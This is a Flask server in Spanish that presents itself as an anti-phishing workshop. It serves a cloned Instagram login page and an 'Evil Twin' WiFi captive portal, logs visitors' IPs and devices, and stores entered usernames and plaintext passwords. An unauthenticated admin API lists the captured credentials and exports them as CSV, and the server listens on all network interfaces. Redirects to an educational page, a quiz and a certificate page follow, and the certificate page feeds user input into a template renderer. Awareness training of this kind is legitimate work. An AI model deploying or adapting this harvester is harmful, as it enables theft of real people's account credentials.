from flask import Flask, request, redirect, render_template_string, jsonify, send_file
import time
import os
import sqlite3
import json
from datetime import datetime
import csv
import io

app = Flask(__name__, static_folder='PruebasHTML', static_url_path='/PruebasHTML')

# Inicializar base de datos
def init_db():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    # Tabla de visitas
    c.execute('''CREATE TABLE IF NOT EXISTS visits
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  scenario TEXT)''')
    
    # Tabla de credenciales capturadas
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  scenario TEXT,
                  username TEXT,
                  password TEXT,
                  extra_data TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

def log_info(tipo, mensaje):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[{timestamp}] [{tipo}] {mensaje}")

def save_visit(ip, user_agent, scenario):
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO visits (timestamp, ip_address, user_agent, scenario) VALUES (?, ?, ?, ?)",
              (timestamp, ip, user_agent, scenario))
    conn.commit()
    conn.close()

def save_capture(ip, user_agent, scenario, username, password, extra_data=None):
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO captures (timestamp, ip_address, user_agent, scenario, username, password, extra_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (timestamp, ip, user_agent, scenario, username, password, extra_data))
    conn.commit()
    conn.close()

@app.route('/')
def home():
    # 1. CAPTURA DE HUELLA DIGITAL (IP + User Agent)
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log_info("VISITA DETECTADA", f"IP: {ip_address} | Dispositivo: {user_agent}")
    save_visit(ip_address, user_agent, "Instagram")

    try:
        with open('PruebasHTML/indexinsta.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: No se encuentra el archivo principal."

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # 2. CAPTURA DE CREDENCIALES
    print("="*60)
    print(f" [!!!] CREDENCIALES CAPTURADAS (IP: {ip_address})")
    print(f" > Usuario:    {username}")
    print(f" > Contraseña: {password}")
    print("="*60)
    
    save_capture(ip_address, user_agent, "Instagram", username, password)
    
    # Redirigir a la página educativa
    return redirect("/educativo?scenario=social")

@app.route('/educativo')
def educativo():
    # Página educativa dinámica
    scenario = request.args.get('scenario', 'general') # default to general
    try:
        with open('PruebasHTML/educativo.html', 'r', encoding='utf-8') as f:
            # Usamos render_template_string para inyectar variables en el HTML leído
            return render_template_string(f.read(), scenario=scenario)
    except FileNotFoundError:
        return "Error: Falta educativo.html"

# --- RUTAS NUEVAS: PORTAL CAUTIVO WIFI (EVIL TWIN) ---

@app.route('/wifi')
def wifi_portal():
    # Renderizamos la página del Portal WiFi
    try:
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        log_info("VISITA WIFI DETECTADA", f"IP: {ip_address} | Dispositivo: {user_agent}")
        save_visit(ip_address, user_agent, "WiFi Portal")
        
        with open('PruebasHTML/wifi_portal.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta wifi_portal.html"

@app.route('/wifi-login', methods=['POST'])
def wifi_login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    print("="*60)
    print(f" [!!!] CREDENCIALES WIFI CAPTURADAS (IP: {ip_address})")
    print(f" > Email/User: {email}")
    print(f" > Password:   {password}")
    print("="*60)
    
    save_capture(ip_address, user_agent, "WiFi Portal", email, password)
    
    # Redirigir a la página educativa
    return redirect("/educativo?scenario=wifi")

# --- DASHBOARD ADMINISTRATIVO ---

@app.route('/admin')
def admin_dashboard():
    try:
        with open('PruebasHTML/dashboard.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta dashboard.html"

@app.route('/email-demo')
def email_demo():
    """Muestra cómo se vería un correo de phishing real"""
    try:
        with open('PruebasHTML/email_phishing.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta email_phishing.html"

@app.route('/juego')
def spot_the_phish_game():
    """Juego interactivo 'Spot the Phish' para detectar phishing"""
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log_info("JUEGO ACCEDIDO", f"IP: {ip_address} | Dispositivo: {user_agent}")
    save_visit(ip_address, user_agent, "Spot the Phish Game")
    
    try:
        with open('PruebasHTML/spot_the_phish.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta spot_the_phish.html"

# --- RUTAS KIT DE SUPERVIVENCIA ---

@app.route('/kit')
@app.route('/recursos')
def kit_recursos():
    """Página principal del Kit de Supervivencia Anti-Phishing"""
    try:
        with open('PruebasHTML/kit_recursos.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta kit_recursos.html"

@app.route('/recursos/checklist')
def recursos_checklist():
    """Checklist de verificación anti-phishing"""
    try:
        with open('recursos/CHECKLIST.md', 'r', encoding='utf-8') as f:
            content = f.read()
            # Convert markdown to simple HTML
            html_content = f"""<!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Checklist Anti-Phishing</title>
                <style>
                    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 2rem auto; padding: 0 1.5rem; line-height: 1.6; }}
                    h1 {{ color: #2563eb; }}
                    h2 {{ color: #374151; margin-top: 2rem; }}
                    code {{ background: #f3f4f6; padding: 0.2rem 0.4rem; border-radius: 4px; }}
                    pre {{ background: #f9fafb; padding: 1rem; border-radius: 8px; overflow-x: auto; }}
                    ul {{ padding-left: 1.5rem; }}
                    .back {{ display: inline-block; margin: 1rem 0; padding: 0.5rem 1rem; background: #2563eb; color: white; text-decoration: none; border-radius: 6px; }}
                </style>
            </head>
            <body>
                <a href="/kit" class="back">← Volver al Kit</a>
                <pre>{content}</pre>
                <a href="/kit" class="back">← Volver al Kit</a>
            </body>
            </html>"""
            return html_content
    except FileNotFoundError:
        return "Error: Falta CHECKLIST.md"

@app.route('/recursos/guia-rapida')
def recursos_guia_rapida():
    """Guía rápida de referencia"""
    try:
        with open('recursos/GUIA_RAPIDA.md', 'r', encoding='utf-8') as f:
            content = f.read()
            html_content = f"""<!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Guía Rápida Anti-Phishing</title>
                <style>
                    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 2rem auto; padding: 0 1.5rem; line-height: 1.6; }}
                    h1 {{ color: #2563eb; }}
                    h2 {{ color: #374151; margin-top: 2rem; }}
                    code {{ background: #f3f4f6; padding: 0.2rem 0.4rem; border-radius: 4px; }}
                    pre {{ background: #f9fafb; padding: 1rem; border-radius: 8px; overflow-x: auto; }}
                    .back {{ display: inline-block; margin: 1rem 0; padding: 0.5rem 1rem; background: #2563eb; color: white; text-decoration: none; border-radius: 6px; }}
                </style>
            </head>
            <body>
                <a href="/kit" class="back">← Volver al Kit</a>
                <pre>{content}</pre>
                <a href="/kit" class="back">← Volver al Kit</a>
            </body>
            </html>"""
            return html_content
    except FileNotFoundError:
        return "Error: Falta GUIA_RAPIDA.md"

@app.route('/recursos/herramientas')
def recursos_herramientas():
    """Herramientas y recursos recomendados"""
    try:
        with open('recursos/HERRAMIENTAS.md', 'r', encoding='utf-8') as f:
            content = f.read()
            html_content = f"""<!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Herramientas Anti-Phishing</title>
                <style>
                    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 2rem auto; padding: 0 1.5rem; line-height: 1.6; }}
                    h1 {{ color: #2563eb; }}
                    h2 {{ color: #374151; margin-top: 2rem; }}
                    code {{ background: #f3f4f6; padding: 0.2rem 0.4rem; border-radius: 4px; }}
                    pre {{ background: #f9fafb; padding: 1rem; border-radius: 8px; overflow-x: auto; }}
                    a {{ color: #2563eb; }}
                    .back {{ display: inline-block; margin: 1rem 0; padding: 0.5rem 1rem; background: #2563eb; color: white; text-decoration: none; border-radius: 6px; }}
                </style>
            </head>
            <body>
                <a href="/kit" class="back">← Volver al Kit</a>
                <pre>{content}</pre>
                <a href="/kit" class="back">← Volver al Kit</a>
            </body>
            </html>"""
            return html_content
    except FileNotFoundError:
        return "Error: Falta HERRAMIENTAS.md"

@app.route('/certificado')
def certificado():
    """Generador de certificado de participación"""
    nombre = request.args.get('nombre', '')
    try:
        with open('PruebasHTML/certificado.html', 'r', encoding='utf-8') as f:
            return render_template_string(f.read(), nombre=nombre)
    except FileNotFoundError:
        # Return simple certificate if file doesn't exist
        return render_template_string("""<!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Certificado</title>
            <style>
                body { font-family: Georgia, serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f5f5; padding: 1rem; }
                .certificate { background: white; padding: 3rem; max-width: 700px; border: 8px double #2563eb; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
                h1 { color: #2563eb; text-align: center; font-size: 2rem; margin-bottom: 2rem; }
                .content { text-align: center; }
                .nombre { font-size: 1.8rem; color: #667eea; font-weight: bold; margin: 2rem 0; }
                input { font-size: 1.5rem; text-align: center; border: none; border-bottom: 2px solid #2563eb; padding: 0.5rem; width: 100%; max-width: 400px; }
                .footer { margin-top: 3rem; text-align: center; color: #666; }
            </style>
        </head>
        <body>
            <div class="certificate">
                <h1>🎓 Certificado de Participación</h1>
                <div class="content">
                    <p>Se certifica que</p>
                    <form method="get" action="/certificado">
                        <input type="text" name="nombre" placeholder="Tu nombre aquí" value="{{ nombre }}" autofocus>
                    </form>
                    <p style="margin-top: 2rem;">ha completado satisfactoriamente el</p>
                    <h2 style="color: #667eea;">Taller de Seguridad Anti-Phishing</h2>
                    <p>demostrando conocimientos en identificación y prevención de ataques de phishing</p>
                    <div class="footer">
                        <p>Enero 2026</p>
                        <p style="margin-top: 1rem;"><a href="/kit">← Volver al Kit</a></p>
                    </div>
                </div>
            </div>
        </body>
        </html>""", nombre=nombre)

@app.route('/api/stats')
def get_stats():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    # Total de visitas
    c.execute("SELECT COUNT(*) FROM visits")
    total_visits = c.fetchone()[0]
    
    # Total de capturas
    c.execute("SELECT COUNT(*) FROM captures")
    total_captures = c.fetchone()[0]
    
    # Tasa de conversión
    conversion_rate = (total_captures / total_visits * 100) if total_visits > 0 else 0
    
    # Víctimas por escenario
    c.execute("SELECT scenario, COUNT(*) FROM captures GROUP BY scenario")
    by_scenario = dict(c.fetchall())
    
    # IPs únicas
    c.execute("SELECT COUNT(DISTINCT ip_address) FROM captures")
    unique_ips = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total_visits': total_visits,
        'total_captures': total_captures,
        'conversion_rate': round(conversion_rate, 2),
        'by_scenario': by_scenario,
        'unique_ips': unique_ips
    })

@app.route('/api/captures')
def get_captures():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC LIMIT 100")
    captures = c.fetchall()
    
    conn.close()
    
    captures_list = []
    for capture in captures:
        captures_list.append({
            'id': capture[0],
            'timestamp': capture[1],
            'ip': capture[2],
            'user_agent': capture[3],
            'scenario': capture[4],
            'username': capture[5],
            'password': capture[6]
        })
    
    return jsonify(captures_list)

@app.route('/api/timeline')
def get_timeline():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("""
        SELECT strftime('%Y-%m-%d %H:00:00', timestamp) as hour, COUNT(*) 
        FROM captures 
        GROUP BY hour 
        ORDER BY hour DESC 
        LIMIT 24
    """)
    timeline = c.fetchall()
    
    conn.close()
    
    return jsonify([{'time': t[0], 'count': t[1]} for t in reversed(timeline)])

@app.route('/api/export/csv')
def export_csv():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    captures = c.fetchall()
    
    conn.close()
    
    # Crear CSV en memoria
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Encabezados
    writer.writerow(['ID', 'Timestamp', 'IP Address', 'User Agent', 'Scenario', 'Username', 'Password', 'Extra Data'])
    
    # Datos
    for capture in captures:
        writer.writerow(capture)
    
    # Convertir a bytes
    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode('utf-8')),
        mimetype='text/csv',
        as_attachment=True,
        download_name=f'phishing_captures_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
    )

if __name__ == '__main__':
    print("""
    =======================================================
     SERVIDOR DE PHISHING AVANZADO (MULTI-SCENARIO)
     
     [ESCENARIO 1] Instagram Clone
     > URL: http://localhost:5000/
     
     [ESCENARIO 2] Evil Twin WiFi Portal
     > URL: http://localhost:5000/wifi
     
     [JUEGO EDUCATIVO] Spot the Phish
     > URL: http://localhost:5000/juego
     
     [KIT DE SUPERVIVENCIA] Recursos Anti-Phishing
     > URL: http://localhost:5000/kit
     
     [ADMINISTRACIÓN] Dashboard
     > URL: http://localhost:5000/admin
     
     - Registro de IPs y Dispositivos: ACTIVADO
     - Captura de Credenciales: ACTIVADO
    =======================================================
    """)
    # Usamos 0.0.0.0 para que sea visible en la red local si se desea
    app.run(host='0.0.0.0', port=5000, debug=False)
